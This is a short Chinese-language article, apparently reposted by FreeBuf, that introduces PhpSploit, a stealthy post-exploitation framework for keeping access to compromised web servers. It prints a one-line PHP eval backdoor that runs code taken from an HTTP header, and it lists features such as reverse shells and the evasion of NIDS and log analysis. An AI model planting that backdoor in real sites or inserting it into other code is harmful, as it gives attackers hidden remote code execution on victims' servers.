今天给大家介绍的是一款名叫PhpSploit的远程控制框架，该工具可以帮助攻击者在客户端与Web服务器端之间建立隐蔽性极强的交互式链接（类似Shell）。简而言之，这是一款后渗透利用工具，它能够让攻击者与目标主机（例如被入侵的Web服务器）维持访问链接，并实现提权操作。
概述
该工具会对标准客户端请求以及Web服务器相关请求的HTTP头数据进行混淆处理，并利用一个小型的多态后门来实现隐蔽通信：
<? @eval($_SERVER['HTTP_PHPSPL01T']) ?>
功能介绍
效率高：
1. 提供了超过20款自动化后渗透利用工具；
2. 运行命令、浏览文件系统、绕过PHP安全限制；
3. 在目标客户端与攻击者端之间实现文件的上传和下载；
4. 通过本地文本编辑器编辑远程文件；
5. 在目标系统中运行SQL语句；
6. 生成反向TCP Shell；
隐蔽性强：
1. 专为偏执狂设计；
2. 日志分析以及NIDS签名检测机制几乎无法检测到它；
3. 绕过安全模式以及常见PHP安全限制；
4. 通信信息隐藏在HTTP头中；
5. 加载的Payload经过了混淆处理以绕过NIDS；
6. 支持http/https/socks4/socks5代理；
使用便捷：
1. 跨平台；
2. 强大的界面，完整的命令支持；
3. 提供了会话保存/加载功能；
4. 支持大型Payload，支持多重请求；
5. 提供了强大的、高度可配置的设置引擎；
6. 每一个设置（例如用户代理）都有多态模式；
7. 提供了完整的插件开发API；
支持的平台（攻击者端）
1. GNU/Linux
2. MacOS X
支持的平台（目标用户端）
1. GNU/Linux
2. BSDLike
3. MacOS X
4. WindowsNT
工具下载
【GitHub传送门】
* 参考来源：n0where，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM